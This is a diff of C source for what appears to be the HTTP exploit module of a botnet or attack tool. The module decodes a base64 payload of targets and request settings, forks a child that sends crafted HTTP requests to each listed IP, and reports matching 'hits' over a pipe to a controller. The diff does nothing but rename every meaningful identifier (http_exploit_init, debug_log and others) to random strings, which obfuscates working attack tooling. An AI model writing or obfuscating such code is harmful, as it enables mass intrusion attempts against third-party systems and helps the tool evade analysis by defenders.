@@ -41,21 +41,21 @@
 #define HTTP_CONNECT_TIMEOUT 5
 #define HTTP_RECV_TIMEOUT    10
 
-int http_exploit_pid  = 0;
-int http_report_fd    = -1;
-static int http_write_fd = -1;
+int _AR2yQ6h  = 0;
+int _NG8vu2i    = -1;
+static int _gu2iz3D = -1;
 
-static void http_report(const char *msg) {
+static void _NL8hg5Q(const char *msg) {
     size_t len = strlen(msg);
     size_t off = 0;
     while (off < len) {
-        ssize_t n = write(http_write_fd, msg + off, len - off);
+        ssize_t n = write(_gu2iz3D, msg + off, len - off);
         if (n <= 0) break;
         off += (size_t)n;
     }
 }
 
-static void http_child_main(const char *b64_payload) {
+static void _xg3BJ3v(const char *b64_payload) {
     dbuf raw;
     char *data;
     char *targets[HTTP_MAX_TARGETS];
@@ -77,14 +77,14 @@ static void http_child_main(const char *b64_payload) {
     int ti;
 
     /* Decode base64 payload */
-    debug_log("[http] child: decoding payload (%zu bytes b64)", strlen(b64_payload));
-    raw = base64_decode(b64_payload);
+    _nS5PJ8Y("[http] child: decoding payload (%zu bytes b64)", strlen(b64_payload));
+    raw = _rr5LH7D(b64_payload);
     if (raw.data == NULL || raw.len < 4) {
-        debug_log("[http] child: invalid payload (data=%p len=%zu)", (void*)raw.data, raw.len);
-        http_report("[http] error: invalid payload\n");
+        _nS5PJ8Y("[http] child: invalid payload (data=%p len=%zu)", (void*)raw.data, raw.len);
+        _NL8hg5Q("[http] error: invalid payload\n");
         return;
     }
-    debug_log("[http] child: decoded %zu bytes", raw.len);
+    _nS5PJ8Y("[http] child: decoded %zu bytes", raw.len);
 
     data = (char *)raw.data;
     data[raw.len] = '\0';
@@ -146,22 +146,22 @@ static void http_child_main(const char *b64_payload) {
         else break;
     }
 
-    debug_log("[http] child: parsed config — method=%s path=%s port=%d ua=%.30s expect=%s headers=%d",
+    _nS5PJ8Y("[http] child: parsed config — method=%s path=%s port=%d ua=%.30s expect=%s headers=%d",
               method, path, port, ua, expect, nheaders);
-    debug_log("[http] child: %d targets, body=%d bytes", ntargets, body_len);
+    _nS5PJ8Y("[http] child: %d targets, body=%d bytes", ntargets, body_len);
 
     if (ntargets == 0) {
-        debug_log("[http] child: no targets, aborting");
-        http_report("[http] error: no targets\n");
+        _nS5PJ8Y("[http] child: no targets, aborting");
+        _NL8hg5Q("[http] error: no targets\n");
         db_free(&raw);
         return;
     }
 
     /* Binary report protocol — buffer hits, aggregate miss/fail */
-    sr_init(http_write_fd);
+    vC8Yg5i(_gu2iz3D);
     int stat_misses = 0, stat_fails = 0;
 
-    debug_log("[http] child: starting %d targets, %s %s port %d", ntargets, method, path, port);
+    _nS5PJ8Y("[http] child: starting %d targets, %s %s port %d", ntargets, method, path, port);
 
     /* Iterate targets */
     for (ti = 0; ti < ntargets; ti++) {
@@ -186,7 +186,7 @@ static void http_child_main(const char *b64_payload) {
             }
         }
 
-        debug_log("[http] child: [%d/%d] target %s:%d", ti + 1, ntargets, ip, target_port);
+        _nS5PJ8Y("[http] child: [%d/%d] target %s:%d", ti + 1, ntargets, ip, target_port);
         struct sockaddr_in addr;
         struct timeval tv;
         int fd, n;
@@ -206,18 +206,18 @@ static void http_child_main(const char *b64_payload) {
         addr.sin_family = AF_INET;
         addr.sin_port = htons((uint16_t)target_port);
         if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
-            debug_log("[http] child: %s invalid IP, skipping", ip);
+            _nS5PJ8Y("[http] child: %s invalid IP, skipping", ip);
             close(fd);
             continue;
         }
 
         if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-            debug_log("[http] child: %s connect failed: %s", ip, strerror(errno));
+            _nS5PJ8Y("[http] child: %s connect failed: %s", ip, strerror(errno));
             close(fd);
             stat_fails++;
             continue;
         }
-        debug_log("[http] child: %s connected, sending %s %s", ip, method, path);
+        _nS5PJ8Y("[http] child: %s connected, sending %s %s", ip, method, path);
 
         /* Build HTTP request (include port in Host header if non-standard) */
         if (target_port == 80 || target_port == 443) {
@@ -258,9 +258,9 @@ static void http_child_main(const char *b64_payload) {
         }
 
         /* Send */
-        debug_log("[http] child: %s sending %d bytes", ip, req_len);
+        _nS5PJ8Y("[http] child: %s sending %d bytes", ip, req_len);
         if (send(fd, req, (size_t)req_len, MSG_NOSIGNAL) <= 0) {
-            debug_log("[http] child: %s send failed: %s", ip, strerror(errno));
+            _nS5PJ8Y("[http] child: %s send failed: %s", ip, strerror(errno));
             close(fd);
             stat_fails++;
             continue;
@@ -268,7 +268,7 @@ static void http_child_main(const char *b64_payload) {
 
         /* Receive response */
         n = (int)recv(fd, resp, sizeof(resp) - 1, 0);
-        debug_log("[http] child: %s recv %d bytes", ip, n);
+        _nS5PJ8Y("[http] child: %s recv %d bytes", ip, n);
         close(fd);
 
         if (n <= 0) {
@@ -291,32 +291,32 @@ static void http_child_main(const char *b64_payload) {
 
             /* Check EXPECT match */
             if (strstr(resp, expect) != NULL) {
-                debug_log("[http] child: %s HIT (status=%s, matched '%s')", ip, status_code, expect);
-                sr_http_hit(addr.sin_addr.s_addr, (uint16_t)atoi(status_code));
+                _nS5PJ8Y("[http] child: %s HIT (status=%s, matched '%s')", ip, status_code, expect);
+                Mp8Qh2e(addr.sin_addr.s_addr, (uint16_t)atoi(status_code));
             } else {
-                debug_log("[http] child: %s MISS (status=%s, no match for '%s')", ip, status_code, expect);
+                _nS5PJ8Y("[http] child: %s MISS (status=%s, no match for '%s')", ip, status_code, expect);
                 stat_misses++;
             }
         }
     }
 
-    debug_log("[http] child: scan complete — %d targets (miss=%d fail=%d)", ntargets, stat_misses, stat_fails);
-    sr_http_done((uint32_t)ntargets, (uint32_t)stat_misses, (uint32_t)stat_fails);
-    sr_flush();
+    _nS5PJ8Y("[http] child: scan complete — %d targets (miss=%d fail=%d)", ntargets, stat_misses, stat_fails);
+    mG4qi2p((uint32_t)ntargets, (uint32_t)stat_misses, (uint32_t)stat_fails);
+    ku8gj5o();
     db_free(&raw);
 }
 
-void http_exploit_init(const char *b64_payload) {
+void St3TW4o(const char *b64_payload) {
     int pipefd[2];
     pid_t pid;
 
-    debug_log("[http] init: starting (current pid=%d)", http_exploit_pid);
-    if (http_exploit_pid > 0) {
-        debug_log("[http] init: already running (pid=%d)", http_exploit_pid);
+    _nS5PJ8Y("[http] init: starting (current pid=%d)", _AR2yQ6h);
+    if (_AR2yQ6h > 0) {
+        _nS5PJ8Y("[http] init: already running (pid=%d)", _AR2yQ6h);
         return;
     }
     if (pipe(pipefd) < 0) {
-        debug_log("[http] init: pipe() failed: %s", strerror(errno));
+        _nS5PJ8Y("[http] init: pipe() failed: %s", strerror(errno));
         return;
     }
 
@@ -329,33 +329,33 @@ void http_exploit_init(const char *b64_payload) {
     if (pid > 0) {
         /* parent — keep read end */
         close(pipefd[1]);
-        http_exploit_pid = pid;
-        http_report_fd = pipefd[0];
-        fcntl(http_report_fd, F_SETFL,
-              fcntl(http_report_fd, F_GETFL) | O_NONBLOCK);
-        debug_log("[http] init: forked child pid=%d, report_fd=%d", pid, http_report_fd);
+        _AR2yQ6h = pid;
+        _NG8vu2i = pipefd[0];
+        fcntl(_NG8vu2i, F_SETFL,
+              fcntl(_NG8vu2i, F_GETFL) | O_NONBLOCK);
+        _nS5PJ8Y("[http] init: forked child pid=%d, report_fd=%d", pid, _NG8vu2i);
         return;
     }
 
     /* child — keep write end */
     close(pipefd[0]);
-    if (g_ctrl_fd >= 0) { close(g_ctrl_fd); g_ctrl_fd = -1; }
-    http_write_fd = pipefd[1];
-    debug_log("[http] child: starting (write_fd=%d)", http_write_fd);
-    http_child_main(b64_payload);
-    debug_log("[http] child: finished, exiting");
+    if (_ib2tD7y >= 0) { close(_ib2tD7y); _ib2tD7y = -1; }
+    _gu2iz3D = pipefd[1];
+    _nS5PJ8Y("[http] child: starting (write_fd=%d)", _gu2iz3D);
+    _xg3BJ3v(b64_payload);
+    _nS5PJ8Y("[http] child: finished, exiting");
     _exit(0);
 }
 
-void http_exploit_kill(void) {
-    debug_log("[http] kill: pid=%d fd=%d", http_exploit_pid, http_report_fd);
-    if (http_exploit_pid > 0) {
-        kill(http_exploit_pid, 9);
-        http_exploit_pid = 0;
+void Gc5wq8T(void) {
+    _nS5PJ8Y("[http] kill: pid=%d fd=%d", _AR2yQ6h, _NG8vu2i);
+    if (_AR2yQ6h > 0) {
+        kill(_AR2yQ6h, 9);
+        _AR2yQ6h = 0;
     }
-    if (http_report_fd >= 0) {
-        close(http_report_fd);
-        http_report_fd = -1;
+    if (_NG8vu2i >= 0) {
+        close(_NG8vu2i);
+        _NG8vu2i = -1;
     }
 }
 
